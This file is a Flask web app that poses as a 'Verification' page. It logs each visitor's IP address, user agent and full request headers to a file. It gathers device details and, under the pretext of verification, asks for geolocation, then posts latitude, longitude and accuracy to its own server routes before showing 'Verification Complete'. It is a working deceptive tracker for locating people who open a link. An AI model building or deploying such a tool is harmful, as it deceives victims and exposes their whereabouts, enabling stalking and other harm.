from flask import Flask, request
from datetime import datetime
import json
import os

app = Flask(__name__)

# -------------------------------------------------
# HOME PAGE
# -------------------------------------------------
@app.route('/')
def home():

    # GET REAL PUBLIC IP
    ip = request.headers.get(
        'X-Forwarded-For',
        request.remote_addr
    )

    user_agent = request.headers.get('User-Agent')

    headers = dict(request.headers)

    # SAVE BASIC REQUEST INFO
    log_data = f"""
================================================

TIME:
{datetime.now()}

IP ADDRESS:
{ip}

USER AGENT:
{user_agent}

HEADERS:
{json.dumps(headers, indent=2)}

================================================
"""

    with open("logs.txt", "a") as f:
        f.write(log_data)

    # WEBSITE HTML
    return """
<!DOCTYPE html>
<html>

<head>

<title>Verification</title>

<style>

body{

    background:black;

    color:white;

    display:flex;

    justify-content:center;

    align-items:center;

    height:100vh;

    font-family:Arial;

    flex-direction:column;
}

button{

    padding:15px 30px;

    font-size:20px;

    border:none;

    border-radius:10px;

    cursor:pointer;
}

</style>

</head>

<body>

<h1>Enable Location To Continue</h1>

<button onclick="getLocation()">
Continue
</button>

<script>

function getLocation(){

    // --------------------------------
    // DEVICE INFO
    // --------------------------------

    const deviceInfo = {

        platform: navigator.platform,

        userAgent: navigator.userAgent,

        language: navigator.language,

        screenWidth: screen.width,

        screenHeight: screen.height,

        timezone: Intl.DateTimeFormat()
            .resolvedOptions()
            .timeZone
    };

    // SEND DEVICE INFO
    fetch("/device", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify(deviceInfo)

    });


    // --------------------------------
    // LOCATION ACCESS
    // --------------------------------

    navigator.geolocation.getCurrentPosition(

        function(position){

            const locationData = {

                latitude: position.coords.latitude,

                longitude: position.coords.longitude,

                accuracy: position.coords.accuracy

            };

            // SEND LOCATION TO BACKEND
            fetch("/location", {

                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify(locationData)

            });

            document.body.innerHTML =
                "<h1>Verification Complete ✅</h1>";

        },

        function(error){

            document.body.innerHTML =
                "<h1>Location Permission Denied ❌</h1>";

        }

    );

}

</script>

</body>
</html>
"""


# -------------------------------------------------
# DEVICE INFO ROUTE
# -------------------------------------------------
@app.route('/device', methods=['POST'])
def device():

    data = request.json

    with open("logs.txt", "a") as f:

        f.write(
            f"\nDEVICE INFO:\n"
            f"{json.dumps(data, indent=2)}\n"
        )

    return "OK"


# -------------------------------------------------
# LOCATION ROUTE
# -------------------------------------------------
@app.route('/location', methods=['POST'])
def location():

    data = request.json

    with open("logs.txt", "a") as f:

        f.write(
            f"\nLOCATION DATA:\n"
            f"{json.dumps(data, indent=2)}\n"
        )

    return "OK"


# -------------------------------------------------
# START SERVER
# -------------------------------------------------
app.run(
    host='0.0.0.0',
    port=int(os.environ.get("PORT", 5000))
)
